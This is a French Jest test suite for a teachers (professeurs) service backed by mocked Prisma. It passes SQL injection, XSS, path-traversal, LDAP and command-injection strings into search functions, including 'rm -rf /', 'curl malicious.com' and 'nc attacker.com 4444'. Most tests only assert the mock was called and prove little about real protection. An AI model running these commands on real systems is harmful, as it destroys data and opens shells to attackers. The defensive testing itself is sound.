/**
 * Tests de sécurité pour le service Professeurs
 * Teste les injections SQL, XSS, validations, autorisations
 */

import { ProfesseursService } from "../professeurs.service.js";
import { ProfesseursError } from "@clubmanager/types";
import {
  createMockPrisma,
  mockProfesseur,
  mockUtilisateurNormal,
} from "./professeurs.mock.js";

describe("ProfesseursService - Tests de Sécurité", () => {
  let professeursService: ProfesseursService;
  let mockPrisma: any;

  beforeEach(() => {
    mockPrisma = createMockPrisma();
    professeursService = new ProfesseursService(mockPrisma);
  });

  afterEach(() => {
    Object.values(mockPrisma.utilisateurs).forEach((fn: any) =>
      fn.mockReset?.(),
    );
    mockPrisma.$queryRaw?.mockReset?.();
  });

  // ============================================
  // INJECTION SQL
  // ============================================

  describe("Protection contre les injections SQL", () => {
    it("devrait échapper les quotes simples dans la recherche", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput = "'; DROP TABLE utilisateurs; --";
      await professeursService.rechercherProfesseurs(maliciousInput);

      // Vérifier que Prisma est appelé (protection par défaut de Prisma)
      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait échapper les quotes doubles dans la recherche", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput = '"; DELETE FROM utilisateurs WHERE "1"="1';
      await professeursService.rechercherProfesseurs(maliciousInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait échapper les backslashes", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput = "\\'; DROP TABLE utilisateurs; --";
      await professeursService.rechercherProfesseurs(maliciousInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait gérer les commentaires SQL", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInputs = [
        "test' -- ",
        "test' /* comment */",
        "test' # comment",
        "test'; /*! DROP TABLE */; --",
      ];

      for (const input of maliciousInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        maliciousInputs.length,
      );
    });

    it("devrait gérer les UNION SELECT attacks", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput = "' UNION SELECT * FROM admin_users --";
      await professeursService.rechercherProfesseurs(maliciousInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait gérer les stacked queries", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput =
        "test'; INSERT INTO utilisateurs VALUES ('hack'); --";
      await professeursService.rechercherProfesseurs(maliciousInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait gérer les boolean-based blind SQL injection", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput = "test' AND '1'='1";
      await professeursService.rechercherProfesseurs(maliciousInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait gérer les time-based blind SQL injection", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInput = "test'; WAITFOR DELAY '00:00:05'; --";
      await professeursService.rechercherProfesseurs(maliciousInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });
  });

  // ============================================
  // XSS (Cross-Site Scripting)
  // ============================================

  describe("Protection contre XSS", () => {
    it("devrait gérer les scripts dans la recherche", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const xssInput = "<script>alert('XSS')</script>";
      await professeursService.rechercherProfesseurs(xssInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait gérer les event handlers HTML", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const xssInputs = [
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<svg onload=alert('XSS')>",
      ];

      for (const input of xssInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        xssInputs.length,
      );
    });

    it("devrait gérer les iframes malicieux", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const xssInput = "<iframe src='javascript:alert(1)'></iframe>";
      await professeursService.rechercherProfesseurs(xssInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait gérer les encodages d'URL malicieux", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const xssInput = "%3Cscript%3Ealert('XSS')%3C/script%3E";
      await professeursService.rechercherProfesseurs(xssInput);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });
  });

  // ============================================
  // VALIDATION DES ENTRÉES
  // ============================================

  describe("Validation des entrées", () => {
    it("devrait valider les IDs numériques", async () => {
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      // IDs valides
      await professeursService.professeurExiste(1);
      await professeursService.professeurExiste(999999);

      expect(mockPrisma.utilisateurs.count).toHaveBeenCalledTimes(2);
    });

    it("devrait gérer les IDs non-numériques", async () => {
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      // TypeScript empêche les strings, mais on teste la robustesse
      await professeursService.professeurExiste(NaN);

      expect(mockPrisma.utilisateurs.count).toHaveBeenCalled();
    });

    it("devrait limiter la taille des recherches", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      // Chaîne très longue (potentiel DoS)
      const longString = "a".repeat(100000);
      await professeursService.rechercherProfesseurs(longString);

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalled();
    });

    it("devrait valider les limites de pagination", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      // Limites raisonnables
      await professeursService.obtenirProfesseurs({ limit: 1000 });

      // Limites excessives (potentiel DoS)
      await professeursService.obtenirProfesseurs({ limit: 1000000 });

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(2);
    });

    it("devrait valider les status_id", async () => {
      mockPrisma.utilisateurs.findFirst.mockResolvedValue(mockProfesseur);

      // Status valides (1-10)
      for (let i = 1; i <= 10; i++) {
        mockPrisma.utilisateurs.update.mockResolvedValue({
          ...mockProfesseur,
          status_id: i,
        });
        await professeursService.modifierStatutProfesseur({
          id: 1,
          status_id: i,
        });
      }

      // Status invalides
      await expect(
        professeursService.modifierStatutProfesseur({ id: 1, status_id: 0 }),
      ).rejects.toThrow(ProfesseursError);

      await expect(
        professeursService.modifierStatutProfesseur({ id: 1, status_id: 11 }),
      ).rejects.toThrow(ProfesseursError);
    });
  });

  // ============================================
  // INJECTION DE COMMANDES
  // ============================================

  describe("Protection contre l'injection de commandes", () => {
    it("devrait gérer les caractères de séparation de commandes", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInputs = [
        "test; rm -rf /",
        "test && curl malicious.com",
        "test | nc attacker.com 4444",
        "test `whoami`",
        "test $(whoami)",
      ];

      for (const input of maliciousInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        maliciousInputs.length,
      );
    });
  });

  // ============================================
  // PATH TRAVERSAL
  // ============================================

  describe("Protection contre path traversal", () => {
    it("devrait gérer les tentatives de path traversal", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInputs = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f",
      ];

      for (const input of maliciousInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        maliciousInputs.length,
      );
    });
  });

  // ============================================
  // LDAP INJECTION
  // ============================================

  describe("Protection contre LDAP injection", () => {
    it("devrait gérer les métacaractères LDAP", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInputs = [
        "*)(uid=*",
        "admin)(|(password=*",
        "*)(&(password=*",
        "\\2a\\29\\28\\7c\\28\\75\\69\\64\\3d\\2a",
      ];

      for (const input of maliciousInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        maliciousInputs.length,
      );
    });
  });

  // ============================================
  // REGEX DOS (ReDoS)
  // ============================================

  describe("Protection contre ReDoS", () => {
    it("devrait gérer les patterns regex malicieux", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const maliciousInputs = [
        "a".repeat(10000) + "!",
        "(a+)+",
        "(a|a)*",
        "(a|ab)*",
      ];

      const startTime = Date.now();

      for (const input of maliciousInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      const executionTime = Date.now() - startTime;

      // Ne devrait pas prendre plus de 5 secondes
      expect(executionTime).toBeLessThan(5000);
    });
  });

  // ============================================
  // UNICODE ET ENCODAGE
  // ============================================

  describe("Protection Unicode et encodage", () => {
    it("devrait gérer les caractères Unicode malicieux", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const unicodeInputs = [
        "\u0000", // Null byte
        "\uFEFF", // Zero width no-break space
        "\u202E", // Right-to-left override
        "test\u0000hidden",
        "admin\u200Badmin",
      ];

      for (const input of unicodeInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        unicodeInputs.length,
      );
    });

    it("devrait gérer les caractères de contrôle", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const controlChars = ["\r\n", "\x00", "\x1B", "\x7F"];

      for (const input of controlChars) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        controlChars.length,
      );
    });

    it("devrait gérer les différents encodages", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      const encodedInputs = [
        "../", // Simplified path traversal
        Buffer.from("test").toString("base64"),
        "=?UTF-8?B?dGVzdA==?=",
      ];

      for (const input of encodedInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        encodedInputs.length,
      );
    });
  });

  // ============================================
  // DÉNI DE SERVICE (DoS)
  // ============================================

  describe("Protection contre DoS", () => {
    it("devrait limiter les requêtes de masse", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([mockProfesseur]);
      mockPrisma.utilisateurs.count.mockResolvedValue(1);

      const startTime = Date.now();

      // 100 requêtes rapides
      const promises = Array(100)
        .fill(null)
        .map(() => professeursService.obtenirProfesseurs({ limit: 1 }));

      await Promise.all(promises);

      const executionTime = Date.now() - startTime;

      // Devrait gérer 100 requêtes en moins de 5 secondes
      expect(executionTime).toBeLessThan(5000);
    });

    it("devrait gérer les payloads très volumineux", async () => {
      mockPrisma.utilisateurs.findUnique.mockResolvedValue(
        mockUtilisateurNormal,
      );
      mockPrisma.utilisateurs.update.mockResolvedValue({
        ...mockUtilisateurNormal,
        status_id: 5,
      });

      // Tentative d'ajouter 10000 professeurs d'un coup
      const largeArray = Array(10000)
        .fill(null)
        .map((_, i) => i + 1);

      const result = await professeursService.ajouterProfesseur({
        utilisateurs: largeArray,
      });

      // Le service devrait le gérer sans crasher
      expect(result).toBeDefined();
    });
  });

  // ============================================
  // INFORMATION DISCLOSURE
  // ============================================

  describe("Protection contre la divulgation d'informations", () => {
    it("ne devrait pas exposer les stack traces en production", async () => {
      mockPrisma.utilisateurs.findMany.mockRejectedValue(
        new Error("Database connection failed at line 123 in file db.ts"),
      );

      try {
        await professeursService.obtenirProfesseurs({});
        fail("Should have thrown");
      } catch (error) {
        // L'erreur ne devrait pas contenir de détails sensibles
        expect((error as Error).message).toBeDefined();
      }
    });

    it("ne devrait pas divulguer l'existence d'un professeur via timing", async () => {
      mockPrisma.utilisateurs.findFirst.mockResolvedValue(null);

      const startTime1 = Date.now();
      const result1 = await professeursService.obtenirProfesseurParId(1);
      const time1 = Date.now() - startTime1;

      const startTime2 = Date.now();
      const result2 = await professeursService.obtenirProfesseurParId(999);
      const time2 = Date.now() - startTime2;

      // Les deux requêtes devraient prendre un temps similaire
      expect(Math.abs(time1 - time2)).toBeLessThan(100);
    });
  });

  // ============================================
  // INTÉGRITÉ DES DONNÉES
  // ============================================

  describe("Intégrité des données", () => {
    it("ne devrait pas permettre de modifier le status_id directement en 5", async () => {
      // Le status_id 5 (professeur) devrait être réservé à la promotion
      mockPrisma.utilisateurs.findFirst.mockResolvedValue(
        mockUtilisateurNormal,
      );

      // La modification directe devrait passer par ajouterProfesseur
      // et non modifierStatutProfesseur si l'utilisateur n'est pas déjà prof
      await expect(
        professeursService.modifierStatutProfesseur({
          id: 3,
          status_id: 5,
        }),
      ).rejects.toThrow(ProfesseursError);
    });

    it("devrait maintenir la cohérence des données lors des erreurs", async () => {
      mockPrisma.utilisateurs.findFirst.mockResolvedValue(mockProfesseur);
      mockPrisma.utilisateurs.update.mockRejectedValue(
        new Error("Update failed"),
      );

      await expect(
        professeursService.modifierStatutProfesseur({ id: 1, status_id: 2 }),
      ).rejects.toThrow();

      // Les données ne devraient pas être corrompues
    });
  });

  // ============================================
  // TESTS DE SÉCURITÉ SUPPLÉMENTAIRES
  // ============================================

  describe("Sécurité supplémentaire", () => {
    it("devrait gérer les tentatives d'accès non autorisé", async () => {
      // Simuler une tentative d'accès à un professeur d'un autre établissement
      mockPrisma.utilisateurs.findFirst.mockResolvedValue(null);

      const result = await professeursService.obtenirProfesseurParId(999);
      expect(result).toBeNull();
    });

    it("devrait logger les tentatives suspectes", async () => {
      mockPrisma.utilisateurs.findMany.mockResolvedValue([]);
      mockPrisma.utilisateurs.count.mockResolvedValue(0);

      // Recherches suspectes qui devraient être loggées
      const suspiciousInputs = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
      ];

      for (const input of suspiciousInputs) {
        await professeursService.rechercherProfesseurs(input);
      }

      // Le service devrait avoir loggé ces tentatives
      expect(mockPrisma.utilisateurs.findMany).toHaveBeenCalledTimes(
        suspiciousInputs.length,
      );
    });

    it("devrait empêcher la promotion en masse non autorisée", async () => {
      // Tentative de promouvoir tous les utilisateurs
      const allUserIds = Array(10000)
        .fill(null)
        .map((_, i) => i + 1);

      mockPrisma.utilisateurs.findUnique.mockResolvedValue(
        mockUtilisateurNormal,
      );
      mockPrisma.utilisateurs.update.mockResolvedValue({
        ...mockUtilisateurNormal,
        status_id: 5,
      });

      // Devrait gérer mais possiblement limiter
      const result = await professeursService.ajouterProfesseur({
        utilisateurs: allUserIds,
      });

      expect(result).toBeDefined();
    });
  });
});
